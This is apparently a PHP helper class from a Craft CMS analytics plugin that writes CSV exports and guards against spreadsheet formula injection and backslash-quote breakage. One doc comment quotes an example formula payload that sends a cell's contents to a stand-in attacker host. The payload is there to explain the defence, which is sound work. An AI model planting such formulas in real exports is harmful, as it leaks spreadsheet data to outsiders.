<?php

namespace coyshdigital\craftanalytics\helpers;

/**
 * CSV encoding for the exports.
 *
 * Its own class rather than a private method on the controller because the
 * interesting part - not handing an administrator's spreadsheet a formula a
 * visitor wrote - is worth testing without standing up a web request.
 */
final class Csv
{
    /**
     * Encodes rows as CSV, with the header taken from the first row's keys.
     *
     * @param array<int,array<string,mixed>> $rows
     */
    public static function encode(array $rows): string
    {
        $handle = fopen('php://temp', 'r+');

        if ($handle === false) {
            throw new \RuntimeException('Could not open a stream for the export.');
        }

        if ($rows !== []) {
            self::putRow($handle, array_keys($rows[0]));

            foreach ($rows as $row) {
                self::putRow($handle, array_values($row));
            }
        }

        rewind($handle);
        $csv = (string)stream_get_contents($handle);
        fclose($handle);

        return $csv;
    }

    /**
     * @param resource $handle
     * @param array<int,mixed> $values
     */
    private static function putRow($handle, array $values): void
    {
        // No escape character: RFC 4180, which is what a CSV actually is.
        //
        // PHP's default is a backslash, and given a value ending in one it
        // encloses the field without doubling it - `/downloads\` is written as
        // "/downloads\". A strict reader copes, because a backslash means
        // nothing to it. A reader that honours backslash escapes does not: it
        // takes the closing quote as escaped and keeps consuming, and one such
        // value swallows the entire rest of the file into a single cell. PHP's
        // own fgetcsv() is in the second group by default, so an export could
        // not reliably be read back by the language that wrote it.
        //
        // That value is reachable: the beacon accepts any path starting with a
        // slash and rejects only newlines and `://`, so a trailing backslash
        // is one request away and the path is exported verbatim.
        fputcsv($handle, array_map(self::neutralise(...), $values), ',', '"', '');
    }

    /**
     * Stops a spreadsheet treating a recorded value as a formula.
     *
     * Almost everything in an export is a value somebody else chose: a path, a
     * referrer host, an event name, a search term. Several of them arrive
     * through the beacon, which anybody can post to. Excel and Sheets evaluate
     * any cell opening with `=`, `+`, `-` or `@`, so a visitor requesting
     * `/=HYPERLINK("https://attacker/"&A1,"Click")` is one CSV download away
     * from running in an administrator's spreadsheet.
     *
     * A leading apostrophe is the standard defusal: the cell displays as
     * typed and is never parsed as a formula. Whitespace is looked past first,
     * because a parser looking for the opening character does the same.
     *
     * Numbers are left alone - they arrive from the stats service as ints and
     * floats, not strings, so a negative figure keeps its minus sign and stays
     * a number in the spreadsheet.
     */
    public static function neutralise(mixed $value): mixed
    {
        if (!is_string($value) || $value === '') {
            return $value;
        }

        $leading = ltrim($value, " \t\r\n");

        if ($leading === '' || !in_array($leading[0], ['=', '+', '-', '@'], true)) {
            return $value;
        }

        return "'" . $value;
    }
}
